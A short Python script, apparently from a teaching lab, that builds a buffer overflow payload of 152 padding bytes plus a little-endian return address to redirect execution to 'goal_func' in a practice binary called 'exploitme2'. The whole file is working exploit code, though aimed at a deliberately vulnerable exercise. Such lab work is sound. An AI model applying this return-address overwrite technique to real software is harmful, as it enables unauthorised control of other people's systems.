#!/usr/bin/env python
# This script creates an exploit that calls goal_func in exploitme2

# Step 1: 152 As
exploit_byte_string = b"A" * 152

# Step 2: The target address
goal_func_address = 0x555555555282

# Step 3: Write the target address as a little endian byte string
goal_func_address_bstr = goal_func_address.to_bytes(8, "little")

# Step 4: Append the target address byte string
exploit_byte_string = exploit_byte_string + goal_func_address_bstr

# Step 5: Write the exploit to a file
with open("training_wheels.exploit", "wb") as f:
    f.write(exploit_byte_string)